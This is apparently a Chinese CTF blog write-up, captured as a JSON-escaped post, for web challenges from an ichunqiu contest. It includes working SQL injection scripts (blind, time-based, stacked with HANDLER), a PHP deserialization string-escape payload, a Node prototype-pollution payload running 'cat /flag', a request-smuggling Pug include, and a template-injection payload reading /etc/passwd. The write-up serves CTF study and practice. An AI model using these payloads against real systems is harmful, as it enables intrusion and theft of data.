filename=\"glzjin.pug\"\nContent-Type: /../template\n\ndoctype html\nhtml\n  head\n    style\n      include ../../../../../../../flag.txt\n\n----------------------------919695033422425209299810--\n\nGET /flag HTTP/1.1\nHost: x\nConnection: close\nx:'''\npayload = payload.replace(\"\\n\", \"\\r\\n\")\npayload = ''.join(chr(int('0xff' + hex(ord(c))[2:].zfill(2), 16)) for c in payload)\nprint(payload)\nr = requests.get('http://3bfb563e-08fd-4430-80c9-4619b1f703e9.node3.buuoj.cn/core?q=' + urllib.parse.quote(payload))\nprint(r.text)\n\nr = requests.get(url+'/?action=glzjin')\nprint(r.text)\n\n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n# ezExpress\n\n打开题目是一个登录界面\n\n![](/pic/127.png)\n\n随意输入一下看看404有什么东西，得到了网页的绝对地址/app\n\n![](/pic/130.png)\n\n扫描发现有源码www.zip,先查看route下的源码\n\n```js\n function safeKeyword(keyword) {   //不能包含admin\n  if(keyword.match(/(admin)/is)) {\n      return keyword\n  }\n  return undefined\n}\n\nrouter.post('/login', function (req, res) {\n  if(req.body.Submit==\"register\")\n   if(safeKeyword(req.body.userid)){      //调用safeKeyword函数进行过滤\n    res.end(\"<script>alert('forbid word');history.go(-1);</script>\") \n   }\n    req.session.user={   //将用户名，密码写入session\n      'user':req.body.userid.toUpperCase(),   //将输入转成大写\n      'passwd': req.body.pwd,\n      'isLogin':false\n    }{\n    res.redirect('/'); \n  }\n  else if(req.body.Submit==\"login\"){\n    if(!req.session.user){res.end(\"<script>alert('register first');history.go(-1);</script>\")}\n    if(req.session.user.user==req.body.userid&&req.body.pwd==req.session.user.passwd){\n      req.session.user.isLogin=true;\n    }\n    else{\n      res.end(\"<script>alert('error passwd');history.go(-1);</script>\")\n    }\n  \n  }\n```\n\n觉得`toUpperCase`有点可疑，[查找资料](https://xz.aliyun.com/t/7184#toc-11)后发现\n\n对于toUpperCase():\n\n```\n字符\"ı\"、\"ſ\" 经过toUpperCase处理后结果为 \"I\"、\"S\"\n```\n\n对于toLowerCase():\n\n```\n字符\"K\"经过toLowerCase处理后结果为\"k\"(这个K不是K)\n```\n\n使用adm`ı`n注册  \n\n\n\nmerge、clone 可能触发原型链污染（暂时没有弄懂为什么会造成原型链污染）https://xz.aliyun.com/t/7184#toc-5\n\n```js\nrouter.post('/action', function (req, res) {\n  if(req.session.user.user!=\"ADMIN\"){res.end(\"<script>alert('ADMIN is asked');history.go(-1);</script>\")} \n  req.session.user.data = clone(req.body);\n  res.end(\"<script>alert('success');history.go(-1);</script>\");  \n});\nrouter.get('/info', function (req, res) {\n  res.render('index',data={'user':res.outputFunctionName});\n})\n```\n\n`/action`代码对post传入的数据进行了clone操作,触发原型链污染。render造成代码执行[参考链接]([https://evi0s.com/2019/08/30/expresslodashejs-%e4%bb%8e%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93%e5%88%b0rce/](https://evi0s.com/2019/08/30/expresslodashejs-从原型链污染到rce/))\n\n传入可造成任意代码执行的数据，提示已经给出，flag在/flag文件中，由于无法显示出来，所以将内容输出到文件，路径已经从404报错页面得到，框架对外显示的路径都是/public/\n\n```http\nPOST /action HTTP/1.1\nHost: f59a86b7-025d-4112-8179-5408079236b0.node3.buuoj.cn\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nContent-Type: application/json\nOrigin: http://f59a86b7-025d-4112-8179-5408079236b0.node3.buuoj.cn\nConnection: close\nReferer: http://f59a86b7-025d-4112-8179-5408079236b0.node3.buuoj.cn/\nCookie: session=s%3AG1zgVNFpJSA-czxyV6IyZ_mCJSStbn_6.Tw40woUQYqkMMTqBQl2SDs8Td0Og%2FepP2NS%2FT24zFK8\nUpgrade-Insecure-Requests: 1\nContent-Length: 133\n\n{\"__proto__\":{\"outputFunctionName\": \"a;global.process.mainModule.require('child_process').exec('cat /flag > /app/public/a.txt');//\"}}\n```\n\n访问/info触发代码执行\n\n![](/pic/129.png)\n\n访问/a.txt得到flag\n\n```\nflag{6d73d1f0-0865-44c3-9851-4e6f38dd58be}\n```\n\n\n\n\n\n参考链接：https://www.zhaoj.in/read-6462.html\n\n","source":"_posts/ichunqiu公益赛web.md","raw":"---\ntitle: ichunqiu公益赛web\ndate: 2020-02-21 14:04:40\ntags:\n - ctf\n - web\n - sql注入\n---\n\n# 简单的招聘系统\n\n打开题目是一个登入界面，是NULL的大佬出的题目\n\n<!--more-->\n\n![](/pic/107.png)\n\n简单的注册admin,admin登入，发现在Profile界面发现存在~~xss~~slelf-xss 还有一个admin界面，提示需要admin才能访问，不过只能获取自己cookie。这是一个坑。\n\n实在是想不到怎么办。\n\n后面想到登入界面可能存在注入,经过测试确实存在sql注入\n\n![](/pic/109.png)\n\n编写脚本，在里面有坑，编码不一样\n\n```php\n# -*- coding: utf-8 -*-\n# @Time    : 1/30/2020 9:42 PM\nimport requests\n\ndef get(payload):\n    url = 'http://3f5788fc3e0d4cd29c4857bd75a3087e9c2af7a010664d15.changame.ichunqiu.com/index.php'\n    data={\n        'lname' : 'admin\\' and '+payload+'#',\n        'lpass' : 'admin'\n    }\n    cookies={\n        'PHPSESSID' : 'bbvvjmdnv20oa9vpub65s4bkr4',\n        '__jsluid_h' : 'a36781563be2b33ed295cec9257f1621'\n    }\n    html = requests.post(url,data=data,cookies=cookies)\n    # print(html)\n    return html\n\ndef binsea(s_payload,len=999):\n    result = ''\n    x=1\n    while x <= len :\n        error = 0\n        left = 0\n        right = 126\n        while left <= right:\n            mid = (left + right) / 2\n            payload = \"ascii(substr((%s),%d,1))>%d\" % (s_payload,x, mid)\n\n            res = get(payload)\n            if res.status_code == 404 or res.status_code == 429:\n                x=x-1\n                error = 1\n                break\n            html=res.text\n            # print('*-*-*-*-*-*', mid)\n            if 'window.location.href=\"./zhaopin.php\"' in html:\n                left = mid +1\n            else:\n                right = mid -1\n        mid = int((left + right + 1) / 2)\n        if mid == 0 :\n            break\n        if error == 0 :\n            result += chr(mid)\n            print(result)\n        x=x+1\n    return result\n\ndef get_database():\n    s_payload='database()'\n    database = binsea(s_payload)\n    print(database)\n\ndef get_tabls(db):\n    s_payload = 'select(group_concat(table_name))from(information_schema.tables)where(table_schema=\\''+db+'\\')'\n    tables=binsea(s_payload)\n\ndef get_columns(table):\n    s_payload = 'select(group_concat(column_name))from(information_schema.columns)where(table_name=\\''+table+'\\')'\n    columns=binsea(s_payload)\n\ndef get_data(columns,table):\n    s_payload='select(group_concat('+columns+'))from('+table+')'\n    password=binsea(s_payload)\n\n\n# get_database() #nzhaopin\n\n# get_tabls('nzhaopin') #backup,flag,user\n\n# get_columns('flag') #id,flaaag\n\nget_data('flaaag','flag') #flag{04418836-27b8-4f85-8c53-74f7e3e53350}\n```\n\n# ezupload\n\n直接上传php后缀，一句话木马，蚁剑链接，执行/readflag\n\n# 盲注\n\n```php\n<?php\n    # flag在fl4g里\n    include 'waf.php';\n    header(\"Content-type: text/html; charset=utf-8\"); \n    $db = new mysql();\n\n    $id = $_GET['id'];\n\n    if ($id) {\n        if(check_sql($id)){\n            exit();\n        } else {\n            $sql = \"select * from flllllllag where id=$id\";\n            $db->query($sql);\n        }\n    }\n    highlight_file(__FILE__);\n```\n\n题目给出了源码，经过测试过滤了如下字符\n\n![](/pic/110.png)\n\n附上脚本\n\n```python\n# -*- coding: utf-8 -*-\nimport requests\nimport time\n\ndef get(payload):\n    url = 'http://c4c11f9e99ba4142b9bfc8ed760a65a985f476a30a93485e.changame.ichunqiu.com/?id=0||'+payload+'%23'\n    html = requests.get(url)\n    # print(url)\n    # print(html)\n    # return html\n\ndef main():\n    result=''\n    for x in range(70):\n        for c in range(32,126):\n            payload=\"if(ascii(substr(fl4g, %d, 1)) ^ %d, sleep(0), sleep(2))\" %(x,c)\n            time1 = time.time()\n            get(payload)\n            time2 = time.time()\n            sec = time2 - time1\n            # print(sec,' ',chr(c))\n            if sec >=1.5:\n                result+=chr(c)\n                print(result)\n                break\n            else:\n                pass\n\nif __name__ =='__main__':\n    main()\n```\n\n\n\n# babyphp\n\n打开还是一个登入界面，访问www.zip发现源码\n\n```php\n//index.php\n<?php\nrequire_once \"lib.php\";\n\nif(isset($_GET['action'])){\n\trequire_once(__DIR__.\"/\".$_GET['action'].\".php\");\n}\nelse{\n\tif($_SESSION['login']==1){\n\t\techo \"<script>window.location.href='./index.php?action=update'</script>\";\n\t}\n\telse{\n\t\techo \"<script>window.location.href='./index.php?action=login'</script>\";\n\t}\n}\n?>\n```\n\n```php\n//lib.php\n<?php\nerror_reporting(0);\nsession_start();\nfunction safe($parm){\n    $array= array('union','regexp','load','into','flag','file','insert',\"'\",'\\\\',\"*\",\"alter\");\n    return str_replace($array,'hacker',$parm);\n}\nclass User\n{\n    public $id;\n    public $age=null;\n    public $nickname=null;\n    public function login() {\n        if(isset($_POST['username'])&&isset($_POST['password'])){\n        $mysqli=new dbCtrl();\n        $this->id=$mysqli->login('select id,password from user where username=?');\n        if($this->id){\n        $_SESSION['id']=$this->id;  \n        $_SESSION['login']=1;\n        echo \"你的ID是\".$_SESSION['id'];\n        echo \"你好！\".$_SESSION['token'];\n        echo \"<script>window.location.href='./update.php'</script>\";\n        return $this->id;\n        }\n    }\n}\n    public function update(){\n        $Info=unserialize($this->getNewinfo());\n        $age=$Info->age;\n        $nickname=$Info->nickname;\n        $updateAction=new UpdateHelper($_SESSION['id'], $Info, \"update user SET age=$age,nickname=$nickname where id=\".$_SESSION['id']);\n        //这个功能还没有写完 先占坑\n    }\n    public function getNewInfo(){\n        $age=$_POST['age'];\n        $nickname=$_POST['nickname'];\n        return safe(serialize(new Info($age,$nickname)));\n    }\n    public function __destruct(){\n        return file_get_contents($this->nickname);//危\n    }\n    public function __toString()\n    {\n        $this->nickname->update($this->age);\n        return \"0-0\";\n    }\n}\nclass Info{\n    public $age;\n    public $nickname;\n    public $CtrlCase;\n    public function __construct($age,$nickname){\n        $this->age=$age;\n        $this->nickname=$nickname;\n    }   \n    public function __call($name,$argument){\n        echo $this->CtrlCase->login($argument[0]);\n    }\n}\nClass UpdateHelper{\n    public $id;\n    public $newinfo;\n    public $sql;\n    public function __construct($newInfo,$sql){\n        $newInfo=unserialize($newInfo);\n        $upDate=new dbCtrl();\n    }\n    public function __destruct()\n    {\n        echo $this->sql;\n    }\n}\nclass dbCtrl\n{\n    public $hostname=\"127.0.0.1\";\n    public $dbuser=\"noob123\";\n    public $dbpass=\"noob123\";\n    public $database=\"noob123\";\n    public $name;\n    public $password;\n    public $mysqli;\n    public $token;\n    public function __construct()\n    {\n        $this->name=$_POST['username'];\n        $this->password=$_POST['password'];\n        $this->token=$_SESSION['token'];\n    }\n    public function login($sql)\n    {\n        $this->mysqli=new mysqli($this->hostname, $this->dbuser, $this->dbpass, $this->database);\n        if ($this->mysqli->connect_error) {\n            die(\"连接失败，错误:\" . $this->mysqli->connect_error);\n        }\n        $result=$this->mysqli->prepare($sql);\n        $result->bind_param('s', $this->name);\n        $result->execute();\n        $result->bind_result($idResult, $passwordResult);\n        $result->fetch();\n        $result->close();\n        if ($this->token=='admin') {\n            return $idResult;\n        }\n        if (!$idResult) {\n            echo('用户不存在!');\n            return false;\n        }\n        if (md5($this->password)!==$passwordResult) {\n            echo('密码错误！');\n            return false;\n        }\n        $_SESSION['token']=$this->name;\n        return $idResult;\n    }\n    public function update($sql)\n    {\n        //还没来得及写\n    }\n}\n```\n\n```php\n//login.php\n<?php\nrequire_once('lib.php');\n?>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /> \n<title>login</title>\n<center>\n\t<form action=\"login.php\" method=\"post\" style=\"margin-top: 300\">\n\t\t<h2>百万前端的用户信息管理系统</h2>\n\t\t<h3>半成品系统 留后门的程序员已经跑路</h3>\n        \t\t<input type=\"text\" name=\"username\" placeholder=\"UserName\" required>\n\t\t<br>\n\t\t<input type=\"password\" style=\"margin-top: 20\" name=\"password\" placeholder=\"password\" required>\n\t\t<br>\n\t\t<button style=\"margin-top:20;\" type=\"submit\">登录</button>\n\t\t<br>\n\t\t<img src='img/1.jpg'>大家记得做好防护</img>\n\t\t<br>\n\t\t<br>\n<?php \n$user=new user();\nif(isset($_POST['username'])){\n\tif(preg_match(\"/union|select|drop|delete|insert|\\#|\\%|\\`|\\@|\\\\\\\\/i\", $_POST['username'])){\n\t\tdie(\"<br>Damn you, hacker!\");\n\t}\n\tif(preg_match(\"/union|select|drop|delete|insert|\\#|\\%|\\`|\\@|\\\\\\\\/i\", $_POST['password'])){\n\t\tdie(\"Damn you, hacker!\");\n\t}\n\t$user->login();\n}\n?>\n\t</form>\n</center>\n```\n\n```php\n//update.php\n<?php\nrequire_once('lib.php');\necho '<html>\n<meta charset=\"utf-8\">\n<title>update</title>\n<h2>这是一个未完成的页面，上线时建议删除本页面</h2>\n</html>';\nif ($_SESSION['login']!=1){\n\techo \"你还没有登陆呢！\";\n}\n$users=new User();\n$users->update();\nif($_SESSION['login']===1){\n\trequire_once(\"flag.php\");\n\techo $flag;\n}\n\n?>\n\n```\n\n大意就是获取admin的密码登入就可以拿到flag。主要审计是lib.php\n\n当时审的时候没有注意到`__toString`这个魔法方法，快结束的时候才注意到。主要还是太菜了\n\n__\\_\\_toString:在 PHP 5.2.0 之前，\\_\\_toString() 方法只有在直接使用于 [echo](http://php.net/manual/zh/function.echo.php) 或 [print](http://php.net/manual/zh/function.print.php) 时才能生效。PHP 5.2.0 之后，则可以在任何字符串环境生效（例如通过 [printf()](http://php.net/manual/zh/function.printf.php)，使用 *%s* 修饰符），但不能用于非字符串环境（如使用 *%d* 修饰符）。自 PHP 5.2.0 起，如果将一个未定义 __toString() 方法的对象转换为字符串，会产生 `E_RECOVERABLE_ERROR` 级别的错误。\n\nindex.php是注入不了的。只能在update.php想办法\n\nuser.php中\n\n```php\n$users=new User();\n$users->update();\n```\n\n去查看user类的update方法\n\n```php\npublic function update(){\n        $Info=unserialize($this->getNewinfo());\n        $age=$Info->age;\n        $nickname=$Info->nickname;\n        $updateAction=new UpdateHelper($_SESSION['id'], $Info, \"update user SET age=$age,nickname=$nickname where id=\".$_SESSION['id']);\n        //这个功能还没有写完 先占坑\n    }\n```\n\n这里有unserialize函数，且$this->getNewinfo()可控，存在序列化漏洞\n\n跳转到getNewinfo方法\n\n```php\npublic function getNewInfo(){\n        $age=$_POST['age'];\n        $nickname=$_POST['nickname'];\n        return safe(serialize(new Info($age,$nickname)));\n    }\n```\n\n再跳转到Info类\n\n```php\nclass Info{\n    public $age;\n    public $nickname;\n    public $CtrlCase;\n    public function __construct($age,$nickname){\n        $this->age=$age;\n        $this->nickname=$nickname;\n    }   \n    public function __call($name,$argument){\n        echo $this->CtrlCase->login($argument[0]);\n    }\n}\n```\n\n这里如果$this->CtrlCase是dbCtrl类的实例魔法方法__call可以调用到dbCtrl::logon（）\n\n且在User::getNewInfo方法中调用了一个safe过滤函数\n\n```php\nfunction safe($parm){\n    $array= array('union','regexp','load','into','flag','file','insert',\"'\",'\\\\',\"*\",\"alter\");\n    return str_replace($array,'hacker',$parm);\n```\n\n存在序列化字符串逃逸漏洞\n\n执行完后，回到User::update方法\n\n```php\npublic function update(){\n        $Info=unserialize($this->getNewinfo());\n        $age=$Info->age;\n        $nickname=$Info->nickname;\n        $updateAction=new UpdateHelper($_SESSION['id'], $Info, \"update user SET age=$age,nickname=$nickname where id=\".$_SESSION['id']);\n        //这个功能还没有写完 先占坑\n    }\n```\n\n跳转到UpdateHelper类\n\n```php\nClass UpdateHelper{\n    public $id;\n    public $newinfo;\n    public $sql;\n    public function __construct($newInfo,$sql){\n        $newInfo=unserialize($newInfo);\n        $upDate=new dbCtrl();\n    }\n    public function __destruct()\n    {\n        echo $this->sql;\n    }\n}\n```\n\n如果$this->sql是一个类对象会触发User::\\_\\_toString方法\n\n```php\npublic function __toString()\n{\n    $this->nickname->update($this->age);\n    return \"0-0\";\n}\n```\n\n有update方法的只有dbCtrl类，但是Info类中有一个魔法调用\n\n```php\npublic function __call($name,$argument){\n        echo $this->CtrlCase->login($argument[0]);\n    }\n```\n\n如果让User类中的$this->nickname为dbCtrl类的实例就调用到dbCtrl::login方法，而且$sql可控\n\n```php\npublic function login($sql)\n    {\n        $this->mysqli=new mysqli($this->hostname, $this->dbuser, $this->dbpass, $this->database);\n        if ($this->mysqli->connect_error) {\n            die(\"连接失败，错误:\" . $this->mysqli->connect_error);\n        }\n        $result=$this->mysqli->prepare($sql);\n        $result->bind_param('s', $this->name);\n        $result->execute();\n        $result->bind_result($idResult, $passwordResult);\n        $result->fetch();\n        $result->close();\n        if ($this->token=='admin') {\n            return $idResult;\n        }\n        if (!$idResult) {\n            echo('用户不存在!');\n            return false;\n        }\n        if (md5($this->password)!==$passwordResult) {\n            echo('密码错误！');\n            return false;\n        }\n        $_SESSION['token']=$this->name;\n        return $idResult;\n    }\n```\n\n附上脚本\n\n```php\n<?php\nclass Info{\n    public $age;\n    public $nickname;\n    public $CtrlCase;\n\n\n}\n\nclass User\n{\n    public $id;\n    public $age;\n    public $nickname;\n    function __construct()\n    {\n        $this->age='select password,id from user where username=?';\n        $this->nickname=new Info();\n        $this->nickname->CtrlCase=new dbCtrl();\n        $this->nickname->nickname='';\n\n    }\n\n}\nclass dbCtrl\n{\n    public $hostname=\"127.0.0.1\";\n    public $dbuser=\"root\";\n    public $dbpass=\"root\";\n    public $database=\"test\";\n    public $name='admin';\n    public $password='1';\n    public $mysqli;\n    public $token='admin';\n\n}\nClass UpdateHelper\n{\n    public $id;\n    public $newinfo;\n    public $sql;\n    function __construct()\n    {\n        $this->sql=new User();\n    }\n}\n\n$test=new UpdateHelper();\n$a=new Info();\n$a->nickname='';\n$a->CtrlCase=$test;\necho urldecode('%09');\necho serialize($a);\n//O:4:\"Info\":3:{s:3:\"age\";N;s:8:\"nickname\";s:0:\"\n\";s:8:\"CtrlCase\";O:12:\"UpdateHelper\":3:{s:2:\"id\";N;s:7:\"newinfo\";N;s:3:\"sql\";O:4:\"User\":3:{s:2:\"id\";N;s:3:\"age\";s:45:\"select password,id from user where username=?\";s:8:\"nickname\";O:4:\"Info\":3:{s:3:\"age\";N;s:8:\"nickname\";s:0:\"\";s:8:\"CtrlCase\";O:6:\"dbCtrl\":8:{s:8:\"hostname\";s:9:\"127.0.0.1\";s:6:\"dbuser\";s:4:\"root\";s:6:\"dbpass\";s:4:\"root\";s:8:\"database\";s:4:\"test\";s:4:\"name\";s:5:\"admin\";s:8:\"password\";s:1:\"1\";s:6:\"mysqli\";N;s:5:\"token\";s:5:\"admin\";}}}}}\n```\n\n使用相应长度的字符逃逸\n\n```http\nage=&nickname=******************************************************************************************flagflag\";s:8:\"CtrlCase\";O:12:\"UpdateHelper\":3:{s:2:\"id\";N;s:7:\"newinfo\";N;s:3:\"sql\";O:4:\"User\":3:{s:2:\"id\";N;s:3:\"age\";s:45:\"select password,id from user where username=?\";s:8:\"nickname\";O:4:\"Info\":3:{s:3:\"age\";N;s:8:\"nickname\";s:0:\"\";s:8:\"CtrlCase\";O:6:\"dbCtrl\":8:{s:8:\"hostname\";s:9:\"127.0.0.1\";s:6:\"dbuser\";s:4:\"root\";s:6:\"dbpass\";s:4:\"root\";s:8:\"database\";s:4:\"test\";s:4:\"name\";s:5:\"admin\";s:8:\"password\";s:1:\"1\";s:6:\"mysqli\";N;s:5:\"token\";s:5:\"admin\";}}}}}\n```\n\n得到MD5，解密，登录即可拿到flag\n\n\n\n# easysqli_copy\n\n打开题目就是源码\n\n```python\n<?php \n    function check($str)\n    {\n        if(preg_match('/union|select|mid|substr|and|or|sleep|benchmark|join|limit|#|-|\\^|&|database/i',$str,$matches))\n        {\n            print_r($matches);\n            return 0;\n        }\n        else\n        {\n            return 1;\n        }\n    }\n    try\n    {\n        $db = new PDO('mysql:host=localhost;dbname=pdotest','root','******');\n    } \n    catch(Exception $e)\n    {\n        echo $e->getMessage();\n    }\n    if(isset($_GET['id']))\n    {\n        $id = $_GET['id'];\n    }\n    else\n    {\n        $test = $db->query(\"select balabala from table1\");\n        $res = $test->fetch(PDO::FETCH_ASSOC);\n        $id = $res['balabala'];\n    }\n    if(check($id))\n    {\n        $query = \"select balabala from table1 where 1=?\";\n        $db->query(\"set names gbk\");\n        $row = $db->prepare($query);\n        $row->bindParam(1,$id);\n        $row->execute();\n    }\n```\n\n没有能在题目结束之前解出来，后面看到一篇[文章](http://www.52bug.cn/hkjs/6152.html)，之前也看到一篇文章，不过只有上半部分。使用预编译加上16禁止就可以绕过\n\n编写盲注脚本\n\n```python\n# -*- coding: utf-8 -*-\nimport requests\nimport time\n\ndef get(payload):\n    url = 'http://localhost/1.php?id=1%df%27;set%20@x='+payload+';prepare%20a%20from%20@x;EXECUTE%20a;'\n    html = requests.get(url)\n    # print(url)\n    # print(html)\n    # return html\n\ndef str2hex(strs):\n    he='0x'\n    for x in strs:\n        he+=hex(ord(x))[2:]\n    # print(he)\n    return he\n\ndef binsea(s_payload,len=999):\n    result = ''\n    x=1\n    while x <= len :\n        error = 0\n        left = 0\n        right = 126\n        while left <= right:\n            mid = (left + right) / 2\n            payload = \"select if(ascii(substr((%s),%d,1))>%d,sleep(1),1)\" % (s_payload,x, mid)\n            payload=str2hex(payload)\n            t1=time.time()\n            res = get(payload)\n            # if res.status_code == 404 or res.status_code == 429:\n            #     x=x-1\n            #     error = 1\n            #     break\n            # html=res.text\n            # print('*-*-*-*-*-*', mid)\n            if time.time()-t1>=1:\n                left = mid +1\n            else:\n                right = mid -1\n        mid = int((left + right + 1) / 2)\n        if mid == 0 :\n            break\n        if error == 0 :\n            result += chr(mid)\n            print(result)\n        x=x+1\n    return result\n\ndef get_database():\n    s_payload='database()'\n    database = binsea(s_payload)\n    print(database)\n\ndef get_tabls(db):\n    s_payload = 'select(group_concat(table_name))from(information_schema.tables)where(table_schema=\\''+db+'\\')'\n    tables=binsea(s_payload)\n\ndef get_columns(table):\n    s_payload = 'select(group_concat(column_name))from(information_schema.columns)where(table_name=\\''+table+'\\')'\n    columns=binsea(s_payload)\n\ndef get_data(columns,table):\n    s_payload='select group_concat('+columns+') from '+table\n    password=binsea(s_payload)\n\n\nget_data('flag','table1')\n```\n\n\n\n\n\n\n\n# blacklist\n\n打开题目是一个提交框，是强网杯 2019随便注改过来的，但是禁止了set，prepare，alter，rename。改表，预处理是不行了。\n\n测试时发现\n\n```php\npreg_match(\"/set|prepare|alter|rename|select|update|delete|drop|insert|where|\\./i\",$inject);\n```\n\n存在堆叠注入\n\n```\n/?inject=1%27||id;show tables;desc words;desc FlagHere;\n```\n\n返回结果如下\n\n```php+HTML\narray(2) {\n  [0]=>\n  string(1) \"1\"\n  [1]=>\n  string(7) \"hahahah\"\n}\n\narray(2) {\n  [0]=>\n  string(1) \"2\"\n  [1]=>\n  string(12) \"miaomiaomiao\"\n}\n\narray(2) {\n  [0]=>\n  string(6) \"114514\"\n  [1]=>\n  string(2) \"ys\"\n}\n\narray(1) {\n  [0]=>\n  string(8) \"FlagHere\"\n}\n\narray(1) {\n  [0]=>\n  string(5) \"words\"\n}\n\narray(6) {\n  [0]=>\n  string(2) \"id\"\n  [1]=>\n  string(7) \"int(10)\"\n  [2]=>\n  string(2) \"NO\"\n  [3]=>\n  string(0) \"\"\n  [4]=>\n  NULL\n  [5]=>\n  string(0) \"\"\n}\n\narray(6) {\n  [0]=>\n  string(4) \"data\"\n  [1]=>\n  string(11) \"varchar(20)\"\n  [2]=>\n  string(2) \"NO\"\n  [3]=>\n  string(0) \"\"\n  [4]=>\n  NULL\n  [5]=>\n  string(0) \"\"\n}\n\narray(6) {\n  [0]=>\n  string(4) \"flag\"\n  [1]=>\n  string(12) \"varchar(100)\"\n  [2]=>\n  string(2) \"NO\"\n  [3]=>\n  string(0) \"\"\n  [4]=>\n  NULL\n  [5]=>\n  string(0) \"\"\n}\n```\n\nflag 在FlagHere表中的flag列，经过测试语句应该是\n\n```\n'select data from words where id=$_GET[id]'\n```\n\n需要跨表查询，由于select被过滤，但是mysql还有一个handler可以使用（打比赛的时候没有找到，太可惜了）\n\n```\npayload：1'; handler FlagHere open; handler FlagHere read first; handler FlagHere close;#\n```\n\n如果表名是数字需要使用反撇号包裹。\n\n\n\n\n\n# Ezsqli\n\n 是一个提交窗口，经过测试过滤了如下字符0\n\n![](/pic/111.png)\n\n后面又测试了一次，发现单独的or没有被过滤，*or就被过滤了\n\n![](/pic/112.png)\n\ninformation_schema.tables可以使用`sys.schema_table_statistics_with_buffer`或`sys.schema_table_statistics_with_buffer`代替。\n\n数据使用无列名注入\n\n首先盲注获取数据库名\n\n附上脚本\n\n```python\n# -*- coding: utf-8 -*-\n# @Time    : 2/24/2020 11:21 AM\n\nimport requests\nimport time\nimport string\n\ndef str2hex(strs):\n    hexs='0x'\n    for x in range(len(strs)):\n        hexs+=hex(ord(strs[x]))[2:]\n    # print(hexs)\n    return hexs\n\ndef get(payload):\n    url='http://0445a30e864f4cd8a6e4a54b3043663dd97491883a5749df.changame.ichunqiu.com/'\n    # print(url)\n\n    data={\n        'id':'0^('+payload+')'\n    }\n    html = requests.post(url,data=data)\n    print(data)\n    return html\n\ndef binsea(s_payload,len=999):\n    result = ''\n    x=1\n    while x <= len :\n        error = 0\n        left = 0\n        right = 126\n        while left <= right:\n            mid = (left + right) / 2\n            payload = \"ascii(substr((%s),%d,1))>%d\" % (s_payload,x, mid)\n            # t1=time.time()\n            res = get(payload)\n            if res.status_code == 404 or res.status_code == 429:\n                x=x-1\n                error = 1\n                break\n            html=res.text\n            # print(html,'*-*-*-*-*-*', mid,'    ',payload)\n            if 'Nu1L' in html:\n                left = mid +1\n            else:\n                right = mid -1\n        mid = int((left + right + 1) / 2)\n        if mid == 0 :\n            break\n        if error == 0 :\n            result += chr(mid)\n            print(result)\n        x=x+1\n    return result\n\ndef get_database():\n    s_payload='database()'\n    database = binsea(s_payload)\n    # print(database)\n\ndef get_tables(db):\n    db=str2hex(db)\n    s_payload = 'select(group_concat(table_name))from(sys.schema_table_statistics_with_buffer)where(table_schema='+db+')'\n    tables=binsea(s_payload)\n\ndef get_columns(table):\n    table = str2hex(table)\n    s_payload = 'select(group_concat(column_name))from(information_schema.columns)where(table_name='+table+')'\n    columns=binsea(s_payload)\n\ndef get_data(columns,table):\n    s_payload='select(group_concat('+columns+'))from('+table+')'\n    password=binsea2(s_payload)\n\ndef binsea2(length=999):\n    result = ''\n    x=1\n    dic='-'+'0123456789'+string.ascii_lowercase+'{}~'\n    while x <= length :\n        error = 0\n        for each in range(len(dic)):\n            payload = \"select (select 1,{})>(select * from f1ag_1s_h3r3_hhhhh)\".format(str2hex(result+dic[each]))\n            print(result+dic[each])\n            # t1=time.time()\n            res = get(payload)\n            if res.status_code == 404 or res.status_code == 429:\n                x=x-1\n                error = 1\n                break\n            html=res.text\n            # print(html[0:-6])\n            if error == 0 and 'Nu1L' in html:\n                result +=dic[each-1]\n                print(result)\n                break\n        x = x + 1\n    return result\n\n\n# get_database() #ctf\n\n# get_tables('ctf')#users233333333333333,f1ag_1s_h3r3_hhhhh\n\nbinsea2()\n```\n\n\n\n\n\n# Flaskapp\n\n打开题目\n\n在解密中随意输入几个，让其报错，爆出部分代码，发现是一个flask框架写的base64的加解密小工具运行在PYTHON3.7。\n\n```python\n@app.route('/decode',methods=['POST','GET'])\n\ndef decode():\n    if request.values.get('text') :\n        text = request.values.get(\"text\")\n        text_decode = base64.b64decode(text.encode())\n        tmp = \"结果 ： {0}\".format(text_decode.decode())\n        if waf(tmp) :\n            flash(\"no no no !!\")\n            return redirect(url_for('decode'))\n        res =  render_template_string(tmp)\n        flash( res )\n        return redirect(url_for('decode'))\n\n    else :\n         text = \"\"\n```\n\n是模板注入，然后还有一个过滤，还能打开python交互界面但是有密码\n\n![](/pic/114.png)\n\n任意文件读取\n\n```pyhton\n{{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__['open']('/etc/passwd').read()}}\nbase64后\ne3soKS5fX2NsYXNzX18uX19iYXNlc19fWzBdLl9fc3ViY2xhc3Nlc19fKClbNzVdLl9faW5pdF9fLl9fZ2xvYmFsc19fLl9fYnVpbHRpbnNfX1snb3BlbiddKCcvZXRjL3Bhc3N3ZCcpLnJlYWQoKX19\n```\n\n结果为\n\n![](/pic/115.png)\n\n提取/app/app.py所有代码\n\n```python\nfrom flask import Flask,render_template_string\nfrom flask import render_template,request,flash,redirect,url_for\nfrom flask_wtf import FlaskForm\nfrom wtforms import StringField, SubmitField\nfrom wtforms.validators import DataRequired\nfrom flask_bootstrap import Bootstrap\nimport base64\n\napp = Flask(__name__)\napp.config['SECRET_KEY'] = 's_e_c_r_e_t_k_e_y'\nbootstrap = Bootstrap(app)\n\nclass NameForm(FlaskForm):\n    text = StringField('BASE64加密',validators= [DataRequired()])\n    submit = SubmitField('提交')\nclass NameForm1(FlaskForm):\n    text = StringField('BASE64解密',validators= [DataRequired()])\n    submit = SubmitField('提交')\n\ndef waf(str):\n    black_list = [\"flag\",\"os\",\"system\",\"popen\",\"import\",\"eval\",\"chr\",\"request\",\n                  \"subprocess\",\"commands\",\"socket\",\"hex\",\"base64\",\"*\",\"?\"]\n    for x in black_list :\n        if x in str.lower() :\n            return 1\n\n\n@app.route('/hint',methods=['GET'])\ndef hint():\n    txt = \"失败乃成功之母！！\"\n    return render_template(\"hint.html\",txt = txt)\n\n\n@app.route('/',methods=['POST','GET'])\ndef encode():\n    if 